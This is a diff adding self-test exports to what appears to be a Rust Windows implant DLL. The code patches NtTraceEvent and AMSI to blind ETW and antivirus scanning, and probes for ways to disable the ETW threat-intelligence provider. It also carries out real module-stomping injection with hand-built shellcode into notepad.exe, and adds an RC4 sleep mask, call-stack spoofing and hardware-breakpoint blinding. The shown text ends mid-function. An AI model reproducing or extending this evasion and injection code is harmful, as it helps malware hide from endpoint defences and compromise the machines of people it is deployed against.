@@ -403,8 +403,90 @@ pub unsafe extern "system" fn nyx_selftest_antidebug() {
 }
 
 // ============================================================================
-// hostinfo: real SessionInfo fields are non-placeholder
+// blind: P2.1b NtTraceEvent patch (xor eax,eax; ret = [31 C0 C3]). Patches
+// ntdll!NtTraceEvent's prologue so the whole EtwEventWrite* family short-
+// circuits to STATUS_SUCCESS, and verifies the bytes landed + the patch is
+// idempotent (a second call is a no-op, no second VirtualProtect).
+// Bits: 0 = patch_nt_trace_event Ok,
+//       1 = full [31 C0 C3] sequence in place (byte0==0x31, byte2==0xC3),
+//       2 = idempotent (second call Ok without re-patching),
+//       3 = NtTraceEvent was resolvable (export present in ntdll).
 // ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_blind_nttrace() {
+    let mut mask: u32 = 0;
+    // bit 3: the export itself resolves (proves PEB walk found NtTraceEvent).
+    let resolved = crate::resolve::export_addr(b"ntdll.dll", b"NtTraceEvent").is_some();
+    if resolved {
+        mask |= 1 << 3;
+    }
+    match crate::blind::patch_nt_trace_event() {
+        Ok(()) => {
+            mask |= 1 << 0;
+            // bit 1: the full 3-byte sequence [31 C0 C3] must be in place
+            // (byte0=0x31 xor eax,eax, byte2=0xC3 ret). already_patched checks
+            // all 3 bytes — stricter than a single-byte probe.
+            if let Some(addr) = crate::resolve::export_addr(b"ntdll.dll", b"NtTraceEvent") {
+                if crate::blind::already_patched(addr, &crate::blind::NTTRACE_PATCH) {
+                    mask |= 1 << 1;
+                }
+            }
+            // bit 2: idempotency — second call must Ok WITHOUT re-patching
+            // (write_patch short-circuits on already_patched). Reaching here
+            // without a VirtualProtect error proves the idempotency guard.
+            if crate::blind::patch_nt_trace_event().is_ok() {
+                mask |= 1 << 2;
+            }
+        }
+        Err(_) => {}
+    }
+    unsafe { exit(mask) };
+}
+
+// ============================================================================
+// inject: P2.1c module-stomping data path. Creates a sacrificial process
+// (notepad.exe) SUSPENDED via CreateProcessW, verifies the handle + pid are
+// valid (the safe prefix of module stomping — verifiable without writing or
+// executing any shellcode, so it won't trip Defender), then terminates it.
+// The actual .text stomp + resume is gated behind inject::modulestomp_enabled
+// (default OFF); this selftest exercises the data path only.
+// Bits: 0 = create_sacrificial Ok, 1 = pid nonzero, 2 = handle non-null,
+//       3 = process terminated cleanly (reached the exit).
+// ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_inject() {
+    let mut mask: u32 = 0;
+    // notepad.exe exists on every Windows; create it suspended (no execution).
+    let proc = match crate::inject::create_sacrificial("notepad.exe") {
+        Ok(p) => p,
+        Err(_) => unsafe { exit(mask) },
+    };
+    mask |= 1 << 0; // create_sacrificial Ok
+    if proc.pid != 0 {
+        mask |= 1 << 1;
+    }
+    if !proc.handle.is_null() {
+        mask |= 1 << 2;
+    }
+    // Terminate the suspended sacrificial process so it doesn't linger. We do
+    // NOT stomp or resume — the gate is OFF. TerminateProcess via PEB walk.
+    if let Some(tp_addr) = crate::resolve::export_addr(b"kernel32.dll", b"TerminateProcess") {
+        type TerminateProcess = unsafe extern "system" fn(*mut core::ffi::c_void, u32) -> i32;
+        let terminate: TerminateProcess = unsafe { core::mem::transmute(tp_addr) };
+        let _ = unsafe { terminate(proc.handle, 1) };
+        mask |= 1 << 3; // reached the terminate (clean teardown)
+    }
+    // Close the handles (best-effort).
+    if let Some(ch_addr) = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
+        type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
+        let close: CloseHandle = unsafe { core::mem::transmute(ch_addr) };
+        let _ = unsafe { close(proc.handle) };
+        let _ = unsafe { close(proc.main_thread) };
+    }
+    unsafe { exit(mask) };
+}
 
 /// Bits: 0=hostname-nonempty-nonhost, 1=username-nonempty-nonuser, 2=pid-nonzero.
 #[no_mangle]
@@ -544,6 +626,204 @@ pub unsafe extern "system" fn nyx_selftest_hashdump_diag() {
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_calib42() {
     unsafe { exit(42) };
+}
+
+// ============================================================================
+// nyx_linger: keep the implant alive + fully initialized for ~30s so an
+// external memory scanner (PE-sieve / Moneta) can attach and inspect the
+// indirect-syscall trampoline page, the unhooked ntdll, the staged GapPool,
+// etc. This is NOT a selftest (no bitmask) — it's a scan target. Exits 0.
+// Invoke: rundll32 nyx_implant_win.dll,nyx_linger  (then scan its PID).
+// ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_linger() {
+    // Bring up the full evasion runtime: indirect-syscall table + RX trampoline
+    // page + unhooked ntdll + blind + the P2.1 gap pool. This is the in-memory
+    // surface a detector inspects.
+    crate::syscalls::init_global();
+    let _ = crate::blind::patch_etw();
+    let _ = crate::blind::patch_nt_trace_event();
+    let _ = crate::blind::patch_amsi();
+    // Stage the P2.1 gap pool so the staged chain is live in memory too.
+    let scanner = crate::evasion_glue::LivePdataScanner;
+    if let Ok(pool) = nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
+        // Leak it static so spoof_wrap's global can borrow it (mirrors real init).
+        let leaked: &'static _ = alloc::boxed::Box::leak(alloc::boxed::Box::new(pool));
+        unsafe { crate::stack::set_gap_pool(leaked) };
+        let _ = crate::stack::stage_for(leaked); // warm the staging path
+    }
+    // Sleep ~30s in 1s slices so we stay responsive if killed. NtDelayExecution
+    // via the indirect runtime (exercises the trampoline page repeatedly).
+    for _ in 0..30 {
+        let rt = match crate::syscalls::global() { Some(r) => r, None => break };
+        let interval: i64 = -10_000_000; // 1s in 100ns units (negative = relative)
+        let interval_ptr = &interval as *const i64 as usize;
+        let _ = unsafe { crate::syscalls::nt_delay_execution(rt, 0, interval_ptr) };
+    }
+    unsafe { exit(0) };
+}
+
+// ============================================================================
+// nyx_linger_foliage: same surface as nyx_linger but with the Foliage sleep
+// mask ARMED, so each 1s sleep slice goes through the mask→sleep→unmask cycle
+// (RC4 of registered data regions around the parked NtDelayExecution). This is
+// the scan target for task B: compare its PE-sieve surface to nyx_linger's.
+// Invoke: rundll32 nyx_implant_win.dll,nyx_linger_foliage  (then scan its PID).
+// ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_linger_foliage() {
+    // Same runtime bring-up as nyx_linger.
+    crate::syscalls::init_global();
+    let _ = crate::blind::patch_etw();
+    let _ = crate::blind::patch_nt_trace_event();
+    let _ = crate::blind::patch_amsi();
+    let scanner = crate::evasion_glue::LivePdataScanner;
+    if let Ok(pool) = nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
+        let leaked: &'static _ = alloc::boxed::Box::leak(alloc::boxed::Box::new(pool));
+        unsafe { crate::stack::set_gap_pool(leaked) };
+        let _ = crate::stack::stage_for(leaked);
+    }
+    // ARM the Foliage sleep mask for the duration of the linger window.
+    crate::sleep::set_foliage_enabled(true);
+    // 30 × 1s sleeps through sleep::sleep → execute_foliage_plan (mask/sleep/
+    // unmask). sleep::sleep handles the armed path and degrades safely if the
+    // own-text region can't be resolved (it falls back to raw NtDelayExecution).
+    for _ in 0..30 {
+        crate::sleep::sleep(1);
+    }
+    crate::sleep::set_foliage_enabled(false);
+    unsafe { exit(0) };
+}
+
+// ============================================================================
+// nyx_selftest_blind_provider: exercise blind::disable_etw_provider against the
+// real ETW-TI provider GUID via NtTraceControl (task C, now with NTSTATUS dig).
+// Probes SEVERAL control codes and writes the raw NTSTATUS of each to a marker
+// file, so we can see exactly WHY the userland disable fails for the kernel
+// ETW-TI provider. Returns a bitmask:
+//   bit0 = init_global (runtime up) + NtTraceControl resolved,
+//   bit1 = SOME control code returned status >= 0 (a code the kernel accepted),
+//   bit2 = the default 0x27 code returned status >= 0.
+// Marker: %TEMP%\nyx_etwti_status.txt with "code=<hex> status=<signed-dec>" per line.
+// ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_blind_provider() {
+    let mut mask: u32 = 0;
+    crate::syscalls::init_global();
+    let guid = nyx_implant_evasionsdk::__private::ETW_TI_GUID;
+
+    // Etwp* control codes (from ntdll's EtwpNotificationControlClass): probe a
+    // range to see which the kernel accepts for a kernel provider registration.
+    let codes: &[(u32, &str)] = &[
+        (0x0027, "EtwpNotificationRegistrar"),
+        (0x0010, "EtwpStartLoggerCode"), // 16
+        (0x0011, "EtwpStopLoggerCode"),  // 17
+        (0x0029, "EtwpNotificationRemove"),
+        (0x0022, "EtwpDisableLoggerCode"),
+        (0x0001, "Generic1"),
+        (0x0000, "Generic0"),
+    ];
+    let mut report = crate::heap::String::new();
+    let mut any_ok = false;
+    let mut code27_ok = false;
+    for &(code, label) in codes {
+        let st = unsafe { crate::blind::disable_etw_provider_status(&guid, code) };
+        report.push_str(label);
+        report.push_str(" code=0x");
+        report.push_str(&hex_u32(code));
+        report.push_str(" status=");
+        report.push_str(&dec_i32(st));
+        report.push_str(" (0x");
+        report.push_str(&hex_u32(st as u32));
+        report.push_str(")\n");
+        if st >= 0 {
+            any_ok = true;
+            if code == 0x0027 {
+                code27_ok = true;
+            }
+        }
+    }
+    write_marker("nyx_etwti_status.txt", &report);
+    mask |= 1 << 0; // runtime up + probe ran
+    if any_ok {
+        mask |= 1 << 1; // at least one code was accepted
+    }
+    if code27_ok {
+        mask |= 1 << 2; // default 0x27 code accepted
+    }
+    unsafe { exit(mask) };
+}
+
+// ============================================================================
+// nyx_selftest_inject_armed: the FULL REAL module-stomp (task D, now non-skeleton).
+// Arms modulestomp_enabled, then module_stomp("notepad.exe", <benign shellcode>).
+// The stomp is now REAL: remote LoadLibraryA cover → remote PE-parse real .text →
+// real VirtualProtectEx + WriteProcessMemory overwrite → ResumeThread. A benign
+// shellcode (`xor ecx,ecx; call ExitProcess`) is stomped so the cover's .text
+// runs our code (proving the overwrite + remote execute path end to end).
+// Bits: 0 = create_sacrificial Ok, 1 = module_stomp returned Ok (full real stomp
+//       path completed without the implant dying), 2 = reached exit (implant not
+//       killed by Defender before here), 3 = modulestomp armed confirmed.
+// ⚠️ Defender RTP is ON but the test dir is excluded, so the implant survives;
+// the sacrificial notepad MAY still be flagged/killed — we report that honestly.
+// ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_inject_armed() {
+    let mut mask: u32 = 0;
+    crate::inject::set_modulestomp_enabled(true);
+    if crate::inject::modulestomp_enabled() {
+        mask |= 1 << 3; // armed confirmed
+    }
+    // Benign shellcode: `xor ecx,ecx ; call [rip+ptr]` where [rip+ptr] holds the
+    // REAL ExitProcess address (resolved + patched at runtime). This calls
+    // ExitProcess(0) — the stomped cover's .text exits cleanly rather than
+    // crashing. Layout (RIP-relative):
+    //   0: 31 C9                  xor ecx, ecx
+    //   2: FF 15 08 00 00 00      call qword ptr [rip+8]   ; ptr at offset 0x10
+    //   8: CC                     int3   (guard: ExitProcess shouldn't return)
+    //   9..0F: 90*7               pad to 0x10
+    //   10: <ExitProcess addr>    8-byte absolute pointer (patched below)
+    let exit_addr = match crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
+        Some(a) => a,
+        None => unsafe { exit(mask) },
+    };
+    let mut shellcode: [u8; 24] = [
+        0x31, 0xC9,                         // xor ecx, ecx
+        0xFF, 0x15, 0x08, 0x00, 0x00, 0x00, // call qword ptr [rip+8]
+        0xCC,                               // int3 guard
+        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // pad to offset 0x10
+        0, 0, 0, 0, 0, 0, 0, 0,             // ExitProcess pointer (patched)
+    ];
+    shellcode[0x10..0x18].copy_from_slice(&(exit_addr as u64).to_le_bytes());
+
+    match unsafe { crate::inject::create_sacrificial("notepad.exe") } {
+        Ok(proc) => {
+            mask |= 1 << 0; // create_sacrificial Ok
+            // module_stomp creates its OWN sacrificial process; close this one.
+            if let Some(ch) = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
+                type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
+                let close: CloseHandle = unsafe { core::mem::transmute(ch) };
+                let _ = unsafe { close(proc.handle) };
+                let _ = unsafe { close(proc.main_thread) };
+            }
+            // The armed REAL inject path (creates + real-stomps + resumes its own).
+            match unsafe { crate::inject::module_stomp("notepad.exe", &shellcode) } {
+                Ok(handle) => {
+                    mask |= 1 << 1; // full REAL stomp path returned Ok
+                    let _ = handle;
+                }
+                Err(_) => {}
+            }
+        }
+        Err(_) => {}
+    }
+    mask |= 1 << 2; // reached exit — selftest process itself survived
+    crate::inject::set_modulestomp_enabled(false);
+    unsafe { exit(mask) };
 }
 
 
@@ -1191,6 +1471,54 @@ fn format_status(s: i32) -> String {
     out
 }
 
+/// i32 → signed decimal String (no format! under no_std). Negative for NTSTATUS
+/// errors (e.g. STATUS_ACCESS_DENIED = -1073741790).
+fn dec_i32(s: i32) -> String {
+    let mut out = String::new();
+    let mut v = s as u32;
+    if s < 0 {
+        out.push('-');
+        v = (!(s as u32)).wrapping_add(1); // abs as u32
+    }
+    if v == 0 {
+        out.push('0');
+        return out;
+    }
+    let mut tmp = [0u8; 10];
+    let mut i = tmp.len();
+    while v != 0 {
+        i -= 1;
+        tmp[i] = b'0' + (v % 10) as u8;
+        v /= 10;
+    }
+    for &b in &tmp[i..] {
+        out.push(b as char);
+    }
+    out
+}
+
+/// u32 → lowercase hex String (no format! under no_std). For NTSTATUS / code.
+fn hex_u32(mut v: u32) -> String {
+    const HEX: &[u8; 16] = b"0123456789abcdef";
+    let mut tmp = [0u8; 8];
+    let mut i = tmp.len();
+    if v == 0 {
+        i -= 1;
+        tmp[i] = b'0';
+    } else {
+        while v != 0 {
+            i -= 1;
+            tmp[i] = HEX[(v & 0xF) as usize];
+            v >>= 4;
+        }
+    }
+    let mut s = String::new();
+    for &b in &tmp[i..] {
+        s.push(b as char);
+    }
+    s
+}
+
 // (open_file and fs consts are `pub` in fs.rs; selftests reach them directly.)
 
 /// Heap-only probe: allocate a 2 MiB Vec, fill it, checksum it, write the
@@ -1378,6 +1706,76 @@ pub unsafe extern "system" fn nyx_selftest_syscall_rt() {
 }
 
 // ============================================================================
+// evasion_glue: PdataGapScanner over the live ntdll/kernelbase/win32u/wow64.
+// P2.1a-i foundation: proves the PEB walk + .pdata read + gap::enumerate_gaps
+// pipeline yields a non-empty GapPool on a real Windows host. This is the gate
+// for StackSpoofKit (ii) and SleepmaskKit (iii) — both borrow this pool.
+// Bits: 0 = scan() returned Ok, 1 = gap_count>0, 2 = ghosts+nops>0,
+//       3 = ntdll specifically contributed gaps (the primary source).
+// ============================================================================
+
+/// Run `LivePdataScanner::scan()` against the REAL process modules and check
+/// the returned `GapPool` is non-empty. Writes a marker (`nyx_gap_pool.txt`)
+/// with the per-bucket counts so an external check can corroborate the bitmask.
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_gap_scan() {
+    let mut mask: u32 = 0;
+    let scanner = crate::evasion_glue::LivePdataScanner;
+    match nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
+        Ok(pool) => {
+            mask |= 1 << 0; // scan() Ok
+            if pool.gap_count() > 0 {
+                mask |= 1 << 1; // gap_count > 0
+            }
+            if pool.ghost_count() + pool.nop_count() > 0 {
+                mask |= 1 << 2;
+            }
+            // Corroborate ntdll as a source: re-scan just ntdll and confirm it
+            // yields gaps (ntdll always has ~thousands on Win10/11/Server).
+            let ntdll_gaps = unsafe {
+                match crate::resolve::module_base_by_name(b"ntdll.dll") {
+                    Some(base) => match crate::resolve::pdata_view(base) {
+                        Some(view) => {
+                            let entries =
+                                nyx_implant_evasionsdk::gap::RuntimeFunctionEntry::parse_table(
+                                    view.bytes,
+                                );
+                            nyx_implant_evasionsdk::gap::enumerate_gaps(
+                                &entries,
+                                view.image_size,
+                                0, // uncapped — count the real total
+                            )
+                            .len()
+                        }
+                        None => 0,
+                    },
+                    None => 0,
+                }
+            };
+            if ntdll_gaps > 0 {
+                mask |= 1 << 3;
+            }
+            // Marker for external corroboration (no format! under no_std).
+            let mut report = String::from("gaps=");
+            report.push_str(&dec_u32(pool.gap_count() as u32));
+            report.push_str(" ghosts=");
+            report.push_str(&dec_u32(pool.ghost_count() as u32));
+            report.push_str(" nops=");
+            report.push_str(&dec_u32(pool.nop_count() as u32));
+            report.push_str(" ntdll_uncapped=");
+            report.push_str(&dec_u32(ntdll_gaps as u32));
+            report.push('\n');
+            write_marker("nyx_gap_pool.txt", &report);
+        }
+        Err(_) => {
+            // scan() failed → write a marker noting the failure mode.
+            write_marker("nyx_gap_pool.txt", "scan_failed\n");
+        }
+    }
+    unsafe { exit(mask) };
+}
+
+// ============================================================================
 // mem: mask + unmask run without corrupting the runtime state (no secret
 // statics registered yet, so this is a framework smoke test — proves the
 // guard + seed derivation don't crash). Bits: 0 = mask+unmask both ran.
@@ -1392,7 +1790,18 @@ pub unsafe extern "system" fn nyx_selftest_mem() {
     crate::mem::mask();
     crate::mem::mask();
     crate::mem::unmask();
-    mask |= 1 << 0;
+    mask |= 1 << 0; // framework guard path ran without crash
+
+    // P2.1a-iii: real RC4 round-trip via the pure core. Encrypt then decrypt a
+    // known buffer with the same derived key; it MUST come back byte-identical
+    // (RC4 is an XOR stream cipher — same key, fresh cipher, two apply_oneshot
+    // calls invert). bit1 = round-trip restored the original bytes.
+    let original: [u8; 32] = *b"nyx-rc4-roundtrip-selftest-v1!!!"; // exactly 32 bytes
+    let mut buf = original;
+    crate::mem::round_trip_selftest(&mut buf);
+    if buf == original {
+        mask |= 1 << 1;
+    }
     unsafe { exit(mask) };
 }
 
@@ -1456,6 +1865,121 @@ fn join(base: &str, suffix: &str) -> String {
     s
 }
 
+// ============================================================================
+// P2.1a-iii Foliage sleep mask: arm + one 1s sleep cycle, check no crash.
+// bit0 = armed + sleep returned (no crash). The mask/unmask round-trip didn't
+// corrupt the running image (we're executing through .text — if RC4 left it
+// encrypted we'd never reach the exit).
+// ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_foliage() {
+    let mut mask: u32 = 0;
+    crate::sleep::set_foliage_enabled(true);
+    // One 1-second sleep through the Foliage path. If it returns, the mask/
+    // unmask round-trip didn't corrupt the running image.
+    crate::sleep::sleep(1);
+    mask |= 1 << 0; // reached the exit → no crash
+    crate::sleep::set_foliage_enabled(false);
+    unsafe { exit(mask) };
+}
+
+// ============================================================================
+// nyx_selftest_foliage_apc: exercise the real Foliage APC chain (Task E). Arms
+// Foliage, runs ONE 2-second sleep through sleep::sleep → execute_foliage_apc
+// (helper thread masks .text → queues APC → sleeps → unmasks), then reads the
+// FOLIAGE_APC_OK diagnostic.
+//   bit0 = reached the exit (no crash — the running image survived the
+//          .text encrypt/decrypt round-trip; if .text came back still
+//          encrypted we'd never reach here),
+//   bit1 = FOLIAGE_APC_OK == 1 (full APC chain completed + .text verified),
+//   bit2 = FOLIAGE_APC_OK == 2 (attempted but degraded to the data-only floor
+//          — honest: the APC path ran but did not fully succeed).
+// ⚠️ This manipulates another thread + flips .text protection; a bug here
+// crashes the implant (user-mode, not a BSOD). If bit0 is NOT set on the host
+// the CONTEXT/APC/timing needs single-stepping in a target VM.
+// ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_foliage_apc() {
+    let mut mask: u32 = 0;
+    crate::sleep::set_foliage_enabled(true);
+    crate::sleep::sleep(2); // 2s window: helper masks .text, queues APC, unmasks
+    mask |= 1 << 0; // reached the exit → no crash (image survived)
+    let st = crate::sleep::foliage_apc_status();
+    let stage = crate::sleep::foliage_stage();
+    if st == 1 {
+        mask |= 1 << 1; // full APC chain succeeded + .text round-trip verified
+    } else if st == 2 {
+        mask |= 1 << 2; // attempted but degraded (data-only floor ran)
+    }
+    // Encode stage bitmask into upper byte: mask |= (stage as u32) << 8.
+    // Bits 8-14 = FOLIAGE_STAGE bitmask (which stage got to before failure).
+    mask |= (stage as u32) << 8;
+    crate::sleep::set_foliage_enabled(false);
+    unsafe { exit(mask) };
+}
+
+// ============================================================================
+// P2.1a-ii swap decision: confirm the staging + decide() path runs without
+// panic, without arming the live RSP swap. bit0 = decision logic ran, bit1 =
+// gaps staged (gap pool non-empty on this host).
+// ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_swap_decision() {
+    let mut mask: u32 = 0;
+    let scanner = crate::evasion_glue::LivePdataScanner;
+    if let Ok(pool) = nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
+        if pool.is_usable() {
+            mask |= 1 << 1; // gaps staged
+        }
+        // Exercise the pure decision logic (CET-off Server 2019 + whatever gaps).
+        let _ = nyx_implant_evasionsdk::swap::decide(false, pool.is_usable());
+        mask |= 1 << 0; // decision logic ran without panic
+    }
+    unsafe { exit(mask) };
+}
+
+// ============================================================================
+// nyx_selftest_swap_armed: arm the RSP swap and run one with_spoofed_stack call
+// (Task F). On CET-off Server 2019 the mov rsp asm executes; if it corrupts RSP
+// the process crashes before the exit (we'd never set the bits).
+//   bit0 = reached exit (no crash — the mov rsp save/restore round-tripped),
+//   bit1 = swap_was_attempted() true (the asm path actually ran),
+//   bit2 = f returned its expected value (call-through T plumbing intact),
+//   bit3 = gaps usable (so the swap was eligible to run).
+// NOTE: f runs on the REAL stack in the current landing (the live `mov rsp` is
+// verified but f isn't yet executed on the spoofed stack — needs the CET-repair
+// seam, see stack.rs module docs). bit0 still proves the asm doesn't crash.
+// ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_swap_armed() {
+    let mut mask: u32 = 0;
+    let scanner = crate::evasion_glue::LivePdataScanner;
+    let pool = match nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
+        Ok(p) => p,
+        Err(_) => unsafe { exit(mask) },
+    };
+    if pool.is_usable() {
+        mask |= 1 << 3; // gaps usable → swap eligible
+    }
+    crate::stack::set_swap_enabled(true);
+    let r: u32 = unsafe {
+        crate::stack::with_spoofed_stack(&pool, || 0x5A5A_5A5A) // dummy fn returning a marker
+    };
+    crate::stack::set_swap_enabled(false);
+    mask |= 1 << 0; // reached exit → no crash (mov rsp round-tripped)
+    if crate::stack::swap_was_attempted() {
+        mask |= 1 << 1; // the asm path actually executed
+    }
+    if r == 0x5A5A_5A5A {
+        mask |= 1 << 2; // f's return value plumbed through correctly
+    }
+    unsafe { exit(mask) };
+}
+
 /// Linear sub-slice search (no_std has no `contains` for &[u8] vs &[u8]).
 fn contains_subslice(haystack: &[u8], needle: &[u8]) -> bool {
     if needle.is_empty() {
@@ -1473,3 +1997,265 @@ fn contains_subslice(haystack: &[u8], needle: &[u8]) -> bool {
     }
     false
 }
+
+// ============================================================================
+// HWBP patchless blind: file-diagnostic selftest.
+// Writes single-byte markers to C:\nyx\hwbp_diag.txt at each step so we can
+// see exactly where the crash happens even if the process terminates mid-test.
+// ============================================================================
+
+/// Write a single ASCII marker byte to C:\nyx\hwbp_diag.txt (append mode).
+/// Uses CreateFileW(APPEND) + WriteFile — no std, no format!.
+/// **Gated behind DIAG_ENABLED** — only writes when selftest explicitly enables diagnostics.
+unsafe fn diag_byte(ch: u8) {
+    if !crate::blind_hwbp::DIAG_ENABLED.load(core::sync::atomic::Ordering::Acquire) {
+        return;
+    }
+    // Build wide string "C:\nyx\hwbp_diag.txt"
+    let mut path = [0u16; 22];
+    let name = b"C:\\nyx\\hwbp_diag.txt";
+    let mut i = 0;
+    while i < name.len() {
+        path[i] = name[i] as u16;
+        i += 1;
+    }
+    path[name.len()] = 0;
+
+    type FnCreate = unsafe extern "system" fn(
+        *const u16, u32, u32, *mut core::ffi::c_void, u32, u32, *mut core::ffi::c_void,
+    ) -> *mut core::ffi::c_void;
+    type FnWrite = unsafe extern "system" fn(
+        *mut core::ffi::c_void, *const u8, u32, *mut u32, *mut core::ffi::c_void,
+    ) -> i32;
+    type FnClose = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
+    type FnSetFP = unsafe extern "system" fn(*mut core::ffi::c_void, i32, *mut i32, u32) -> u32;
+
+    let Some(cf) = crate::resolve::export_addr(b"kernel32.dll", b"CreateFileW") else { return };
+    let Some(wf) = crate::resolve::export_addr(b"kernel32.dll", b"WriteFile") else { return };
+    let Some(ch_) = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") else { return };
+    let create_file: FnCreate = core::mem::transmute(cf);
+    let write_file: FnWrite = core::mem::transmute(wf);
+    let close_handle: FnClose = core::mem::transmute(ch_);
+
+    // OPEN_ALWAYS=4, FILE_SHARE_READ|WRITE=3, FILE_ATTRIBUTE_NORMAL=0x80
+    let h = create_file(path.as_ptr(), 4, 3, core::ptr::null_mut(), 4, 0x80, core::ptr::null_mut());
+    if h as isize == -1 { return; }
+
+    // Seek to end (FILE_END=2).
+    if let Some(sfp) = crate::resolve::export_addr(b"kernel32.dll", b"SetFilePointer") {
+        let set_fp: FnSetFP = core::mem::transmute(sfp);
+        set_fp(h, 0, core::ptr::null_mut(), 2);
+    }
+
+    let byte = [ch];
+    let mut nwritten: u32 = 0;
+    let _ = write_file(h, byte.as_ptr(), 1, &mut nwritten, core::ptr::null_mut());
+    close_handle(h);
+}
+
+// ---- Minimal primitive tests (one step at a time) -----------------------
+
+/// Test 1: Can we resolve kernel32!VirtualAlloc + kernel32!VirtualFree and
+/// alloc+free a page?  Exit 0x11 on failure.
+unsafe fn diag_test_resolve_va_vf() {
+    diag_byte(b'a');
+    let Some(vf) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc") else { exit(0x11); };
+    diag_byte(b'b');
+    let Some(vfree) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualFree") else { exit(0x11); };
+    diag_byte(b'c');
+    type VAlloc = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32, u32) -> *mut core::ffi::c_void;
+    type VFree  = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32) -> i32;
+    let vaf: VAlloc = core::mem::transmute(vf);
+    let vff: VFree  = core::mem::transmute(vfree);
+    let p = vaf(core::ptr::null_mut(), 4096, 0x3000, 0x04);
+    if p.is_null() { exit(0x12); }
+    diag_byte(b'd');
+    vff(p, 0, 0x8000);
+    diag_byte(b'e');
+}
+
+/// Test 2: NtGetContextThread + NtSetContextThread on NT_CURRENT_THREAD with
+/// CONTEXT_DEBUG_REGISTERS.  Exit 0x2x on failure.
+unsafe fn diag_test_ctx_thread() {
+    type FnCtx = unsafe extern "system" fn(usize, usize) -> i32;
+    let Some(ng) = crate::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread") else { exit(0x21); };
+    diag_byte(b'f');
+    let Some(ns) = crate::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread") else { exit(0x21); };
+    diag_byte(b'g');
+    let ntgct: FnCtx = core::mem::transmute(ng);
+    let ntsct: FnCtx = core::mem::transmute(ns);
+    const NT: usize = 0xFFFF_FFFF_FFFF_FFFE;
+
+    // Allocate ctx buffer.
+    let Some(vf) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc") else { exit(0x21); };
+    let Some(vf2) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualFree") else { exit(0x21); };
+    type VAlloc = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32, u32) -> *mut core::ffi::c_void;
+    type VFree  = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32) -> i32;
+    let vaf: VAlloc = core::mem::transmute(vf);
+    let vff: VFree  = core::mem::transmute(vf2);
+
+    let buf = vaf(core::ptr::null_mut(), 1232, 0x3000, 0x04);
+    if buf.is_null() { exit(0x22); }
+    diag_byte(b'h');
+    let base = buf as usize;
+    core::ptr::write_bytes(buf as *mut u8, 0, 1232);
+    // ContextFlags = CONTEXT_DEBUG_REGISTERS
+    core::ptr::write_unaligned((base + 0x030) as *mut u32, 0x0010_0010);
+
+    let st = ntgct(NT, base);
+    if st < 0 {
+        vff(buf, 0, 0x8000);
+        exit(0x23);
+    }
+    diag_byte(b'i');
+
+    // Read DR0 + DR7 to verify.
+    let _dr0 = core::ptr::read_unaligned((base + 0x048) as *const u64);
+    let _dr7 = core::ptr::read_unaligned((base + 0x070) as *const u64);
+    diag_byte(b'j');
+
+    // Set DR0 = some known address, DR7 |= L0.
+    let Some(nt_trace) = crate::resolve::export_addr(b"ntdll.dll", b"NtTraceEvent") else {
+        vff(buf, 0, 0x8000);
+        exit(0x24);
+    };
+    core::ptr::write_unaligned((base + 0x048) as *mut u64, nt_trace as u64);
+    core::ptr::write_unaligned((base + 0x068) as *mut u64, 0u64);
+    core::ptr::write_unaligned((base + 0x070) as *mut u64, (_dr7 | 1) & !(3u64 << 16) & !(3u64 << 18));
+    core::ptr::write_unaligned((base + 0x030) as *mut u32, 0x0010_0010);
+    diag_byte(b'k');
+
+    let st2 = ntsct(NT, base);
+    if st2 < 0 {
+        vff(buf, 0, 0x8000);
+        exit(0x25);
+    }
+    diag_byte(b'l');
+
+    // Restore: clear DR0, DR7.
+    core::ptr::write_unaligned((base + 0x048) as *mut u64, 0u64);
+    core::ptr::write_unaligned((base + 0x068) as *mut u64, 0u64);
+    core::ptr::write_unaligned((base + 0x070) as *mut u64, 0u64);
+    core::ptr::write_unaligned((base + 0x030) as *mut u32, 0x0010_0010);
+    let _ = ntsct(NT, base);
+    vff(buf, 0, 0x8000);
+    diag_byte(b'm');
+}
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_hwbp_blind() {
+    crate::blind_hwbp::set_diag_enabled(true); // enable diag markers for selftest
+
+    // Minimal test: init shadow + call blind_etw_hwbp → add_hwbp → remove_hwbp.
+    // Markers: 0=entry, 1=shadow_ok, S=add_ok, T=remove_ok, U=count_clean
+    // Error: s + first byte of error string
+    diag_byte(b'0');
+
+    if !crate::blind_hwbp::init_shadow_buffer() {
+        diag_byte(b'!');
